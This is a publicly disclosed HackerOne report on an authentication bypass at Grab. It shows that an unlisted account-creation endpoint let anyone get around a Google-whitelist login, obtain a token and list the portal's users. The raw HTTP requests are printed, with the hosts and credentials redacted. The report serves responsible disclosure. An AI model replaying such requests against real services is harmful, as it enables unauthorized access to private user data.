@@ -1,0 +1,62 @@
+ReportLink:https://hackerone.com/reports/318099
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/grouptherapy
+ReportedTo:Grabtaxi Holdings Pte Ltd(grab)
+BountyAmount:1000.0
+Severity:medium
+State:Closed
+DateOfDisclosure:28.02.2018 5:16:59
+
+Summary:
+The researcher has identified an under development portal which had login restricted only to whitelisted Google accounts. They then discovered an endpoint which allowed creation of new user accounts, thus bypassing the login restriction and allowing them to access an API call that was leaking a list of users that were allowed to access the portal.
+
+We're thankful to @grouptherapy for this fine bug and short yet easy to reproduce bug report. 
+**Summary:**
+An attacker can register an account on the `█████████grab.com` service, and access information from the service
+
+
+**Description:** 
+While logging in via Google accounts is prohibited, an attacker can register an account through the `/login/create` endpoint, as per the below request
+```
+POST /login/create HTTP/1.1
+Host: █████grab.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://███grab.com/
+Authorization: Bearer null
+Content-Type: application/json
+Content-Length: 61
+Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
+Connection: close
+
+{"userid":"█████","password":"██████"}
+```
+
+
+This can then be used to log in via the `/login` endpoint ,as in the following request:
+```
+POST /login HTTP/1.1
+Host: █████grab.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://█████grab.com/
+Authorization: Bearer null
+Content-Type: application/json
+Content-Length: 61
+Cookie: G_ENABLED_IDPS=google; G_AUTHUSER_H=0
+Connection: close
+
+{"userid":"██████","password":"████"}
+```
+which returns a valid token. F265433
+
+This token can be used to access some of the endpoints, such as
+`/api/find/users`, as in the following request: F265434
+
+## Impact
+
+An attacker can access information in the system such as registered users. The application appears to be newly developed, and as such little information is stored currently.
